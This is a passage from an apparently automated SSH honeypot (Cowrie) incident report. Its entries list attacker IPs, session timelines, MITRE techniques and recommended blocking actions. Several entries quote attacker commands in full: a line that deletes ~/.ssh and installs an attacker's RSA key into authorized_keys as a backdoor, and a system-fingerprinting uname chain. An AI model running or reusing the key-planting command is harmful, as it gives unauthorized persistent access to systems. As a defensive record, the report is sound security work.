| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:43` | `cowrie.session.connect` |
| `2026-07-05 04:06:43` | `cowrie.client.version` |
| `2026-07-05 04:06:44` | `cowrie.client.kex` |
| `2026-07-05 04:06:44` | `cowrie.login.success` |
| `2026-07-05 04:06:45` | `cowrie.session.params` |
| `2026-07-05 04:06:45` | `cowrie.command.input` |
| `2026-07-05 04:06:45` | `cowrie.command.failed` |
| `2026-07-05 04:06:46` | `cowrie.log.closed` |
| `2026-07-05 04:06:47` | `cowrie.session.params` |
| `2026-07-05 04:06:47` | `cowrie.command.input` |
| `2026-07-05 04:06:47` | `cowrie.session.file_download` |
| `2026-07-05 04:06:47` | `cowrie.log.closed` |
| `2026-07-05 04:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d3095582ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:46` | `cowrie.session.connect` |
| `2026-07-05 04:06:47` | `cowrie.client.version` |
| `2026-07-05 04:06:47` | `cowrie.client.kex` |
| `2026-07-05 04:06:50` | `cowrie.login.success` |
| `2026-07-05 04:06:52` | `cowrie.session.params` |
| `2026-07-05 04:06:52` | `cowrie.command.input` |
| `2026-07-05 04:06:52` | `cowrie.command.input` |
| `2026-07-05 04:06:52` | `cowrie.command.input` |
| `2026-07-05 04:06:52` | `cowrie.command.input` |
| `2026-07-05 04:06:53` | `cowrie.command.input` |
| `2026-07-05 04:06:53` | `cowrie.command.success` |
| `2026-07-05 04:06:53` | `cowrie.command.input` |
| `2026-07-05 04:06:53` | `cowrie.command.input` |
| `2026-07-05 04:06:53` | `cowrie.command.input` |
| `2026-07-05 04:06:53` | `cowrie.command.input` |
| `2026-07-05 04:06:54` | `cowrie.log.closed` |
| `2026-07-05 04:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab7b29b17e0

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:47` | `cowrie.session.connect` |
| `2026-07-05 04:06:47` | `cowrie.client.version` |
| `2026-07-05 04:06:48` | `cowrie.client.kex` |
| `2026-07-05 04:06:48` | `cowrie.login.success` |
| `2026-07-05 04:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1666411c7a84

| Field | Detail |
|---|---|
| **Source IP** | `114.111.54[.]189` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:49` | `cowrie.session.connect` |
| `2026-07-05 04:06:49` | `cowrie.client.version` |
| `2026-07-05 04:06:49` | `cowrie.client.kex` |
| `2026-07-05 04:06:50` | `cowrie.login.success` |
| `2026-07-05 04:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.111.54[.]189` to AbuseIPDB if not already reported
- [ ] Block `114.111.54[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89d62b108d0

| Field | Detail |
|---|---|
| **Source IP** | `136.248.121[.]226` |
| **First Seen** | 2026-07-05 04:06 |
| **Last Seen** | 2026-07-05 04:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:06:59` | `cowrie.session.connect` |
| `2026-07-05 04:06:59` | `cowrie.client.version` |
| `2026-07-05 04:06:59` | `cowrie.client.kex` |
| `2026-07-05 04:07:00` | `cowrie.login.success` |
| `2026-07-05 04:07:01` | `cowrie.session.params` |
| `2026-07-05 04:07:01` | `cowrie.command.input` |
| `2026-07-05 04:07:01` | `cowrie.command.failed` |
| `2026-07-05 04:07:01` | `cowrie.log.closed` |
| `2026-07-05 04:07:02` | `cowrie.session.params` |
| `2026-07-05 04:07:02` | `cowrie.command.input` |
| `2026-07-05 04:07:02` | `cowrie.session.file_download` |
| `2026-07-05 04:07:02` | `cowrie.log.closed` |
| `2026-07-05 04:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.248.121[.]226` to AbuseIPDB if not already reported
- [ ] Block `136.248.121[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85ce87e1f79

| Field | Detail |
|---|---|
| **Source IP** | `136.248.121[.]226` |
| **First Seen** | 2026-07-05 04:07 |
| **Last Seen** | 2026-07-05 04:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:07:02` | `cowrie.session.connect` |
| `2026-07-05 04:07:02` | `cowrie.client.version` |
| `2026-07-05 04:07:02` | `cowrie.client.kex` |
| `2026-07-05 04:07:03` | `cowrie.login.success` |
| `2026-07-05 04:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.248.121[.]226` to AbuseIPDB if not already reported
- [ ] Block `136.248.121[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9e1415be05

| Field | Detail |
|---|---|
| **Source IP** | `136.248.121[.]226` |
| **First Seen** | 2026-07-05 04:07 |
| **Last Seen** | 2026-07-05 04:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:07:03` | `cowrie.session.connect` |
| `2026-07-05 04:07:03` | `cowrie.client.version` |
| `2026-07-05 04:07:03` | `cowrie.client.kex` |
| `2026-07-05 04:07:04` | `cowrie.login.success` |
| `2026-07-05 04:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.248.121[.]226` to AbuseIPDB if not already reported
- [ ] Block `136.248.121[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc040db9a75

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:08 |
| **Last Seen** | 2026-07-05 04:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:08:14` | `cowrie.session.connect` |
| `2026-07-05 04:08:14` | `cowrie.client.version` |
| `2026-07-05 04:08:14` | `cowrie.client.kex` |
| `2026-07-05 04:08:18` | `cowrie.login.success` |
| `2026-07-05 04:08:19` | `cowrie.session.params` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.success` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:19` | `cowrie.command.input` |
| `2026-07-05 04:08:21` | `cowrie.log.closed` |
| `2026-07-05 04:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02653793fc8

| Field | Detail |
|---|---|
| **Source IP** | `107.175.156[.]152` |
| **First Seen** | 2026-07-05 04:09 |
| **Last Seen** | 2026-07-05 04:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:09:29` | `cowrie.session.connect` |
| `2026-07-05 04:09:29` | `cowrie.client.version` |
| `2026-07-05 04:09:29` | `cowrie.client.kex` |
| `2026-07-05 04:09:29` | `cowrie.login.success` |
| `2026-07-05 04:09:30` | `cowrie.session.params` |
| `2026-07-05 04:09:30` | `cowrie.command.input` |
| `2026-07-05 04:09:30` | `cowrie.command.failed` |
| `2026-07-05 04:09:30` | `cowrie.log.closed` |
| `2026-07-05 04:09:30` | `cowrie.session.params` |
| `2026-07-05 04:09:30` | `cowrie.command.input` |
| `2026-07-05 04:09:31` | `cowrie.session.file_download` |
| `2026-07-05 04:09:31` | `cowrie.log.closed` |
| `2026-07-05 04:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.156[.]152` to AbuseIPDB if not already reported
- [ ] Block `107.175.156[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbfb2e6e80a8

| Field | Detail |
|---|---|
| **Source IP** | `107.175.156[.]152` |
| **First Seen** | 2026-07-05 04:09 |
| **Last Seen** | 2026-07-05 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:09:31` | `cowrie.session.connect` |
| `2026-07-05 04:09:31` | `cowrie.client.version` |
| `2026-07-05 04:09:31` | `cowrie.client.kex` |
| `2026-07-05 04:09:31` | `cowrie.login.success` |
| `2026-07-05 04:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.156[.]152` to AbuseIPDB if not already reported
- [ ] Block `107.175.156[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41369365828b

| Field | Detail |
|---|---|
| **Source IP** | `107.175.156[.]152` |
| **First Seen** | 2026-07-05 04:09 |
| **Last Seen** | 2026-07-05 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:09:31` | `cowrie.session.connect` |
| `2026-07-05 04:09:31` | `cowrie.client.version` |
| `2026-07-05 04:09:31` | `cowrie.client.kex` |
| `2026-07-05 04:09:31` | `cowrie.login.success` |
| `2026-07-05 04:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.156[.]152` to AbuseIPDB if not already reported
- [ ] Block `107.175.156[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef1153a7694f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:09 |
| **Last Seen** | 2026-07-05 04:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:09:43` | `cowrie.session.connect` |
| `2026-07-05 04:09:44` | `cowrie.client.version` |
| `2026-07-05 04:09:44` | `cowrie.client.kex` |
| `2026-07-05 04:09:46` | `cowrie.login.success` |
| `2026-07-05 04:09:49` | `cowrie.session.params` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.success` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:49` | `cowrie.command.input` |
| `2026-07-05 04:09:50` | `cowrie.log.closed` |
| `2026-07-05 04:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1d97a41120

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:11 |
| **Last Seen** | 2026-07-05 04:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:11:10` | `cowrie.session.connect` |
| `2026-07-05 04:11:11` | `cowrie.client.version` |
| `2026-07-05 04:11:11` | `cowrie.client.kex` |
| `2026-07-05 04:11:14` | `cowrie.login.success` |
| `2026-07-05 04:11:15` | `cowrie.session.params` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.success` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:15` | `cowrie.command.input` |
| `2026-07-05 04:11:16` | `cowrie.log.closed` |
| `2026-07-05 04:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9888ea2b4f85

| Field | Detail |
|---|---|
| **Source IP** | `209.99.184[.]143` |
| **First Seen** | 2026-07-05 04:12 |
| **Last Seen** | 2026-07-05 04:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:12:27` | `cowrie.session.connect` |
| `2026-07-05 04:12:27` | `cowrie.client.version` |
| `2026-07-05 04:12:28` | `cowrie.client.kex` |
| `2026-07-05 04:12:28` | `cowrie.login.success` |
| `2026-07-05 04:12:29` | `cowrie.session.params` |
| `2026-07-05 04:12:29` | `cowrie.command.input` |
| `2026-07-05 04:12:29` | `cowrie.command.failed` |
| `2026-07-05 04:12:29` | `cowrie.log.closed` |
| `2026-07-05 04:12:30` | `cowrie.session.params` |
| `2026-07-05 04:12:30` | `cowrie.command.input` |
| `2026-07-05 04:12:30` | `cowrie.session.file_download` |
| `2026-07-05 04:12:30` | `cowrie.log.closed` |
| `2026-07-05 04:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.184[.]143` to AbuseIPDB if not already reported
- [ ] Block `209.99.184[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2690a3b3c89

| Field | Detail |
|---|---|
| **Source IP** | `209.99.184[.]143` |
| **First Seen** | 2026-07-05 04:12 |
| **Last Seen** | 2026-07-05 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:12:30` | `cowrie.session.connect` |
| `2026-07-05 04:12:30` | `cowrie.client.version` |
| `2026-07-05 04:12:30` | `cowrie.client.kex` |
| `2026-07-05 04:12:30` | `cowrie.login.success` |
| `2026-07-05 04:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.184[.]143` to AbuseIPDB if not already reported
- [ ] Block `209.99.184[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a042f1a95d8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.184[.]143` |
| **First Seen** | 2026-07-05 04:12 |
| **Last Seen** | 2026-07-05 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:12:31` | `cowrie.session.connect` |
| `2026-07-05 04:12:31` | `cowrie.client.version` |
| `2026-07-05 04:12:31` | `cowrie.client.kex` |
| `2026-07-05 04:12:31` | `cowrie.login.success` |
| `2026-07-05 04:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.184[.]143` to AbuseIPDB if not already reported
- [ ] Block `209.99.184[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f158a4194345

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:12 |
| **Last Seen** | 2026-07-05 04:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:12:37` | `cowrie.session.connect` |
| `2026-07-05 04:12:38` | `cowrie.client.version` |
| `2026-07-05 04:12:38` | `cowrie.client.kex` |
| `2026-07-05 04:12:40` | `cowrie.login.success` |
| `2026-07-05 04:12:41` | `cowrie.session.params` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.success` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:41` | `cowrie.command.input` |
| `2026-07-05 04:12:42` | `cowrie.log.closed` |
| `2026-07-05 04:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40549c6221f5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 04:12 |
| **Last Seen** | 2026-07-05 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:12:58` | `cowrie.session.connect` |
| `2026-07-05 04:12:58` | `cowrie.client.version` |
| `2026-07-05 04:12:58` | `cowrie.client.kex` |
| `2026-07-05 04:12:58` | `cowrie.login.success` |
| `2026-07-05 04:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af9bb3c4bd03

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 04:12 |
| **Last Seen** | 2026-07-05 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
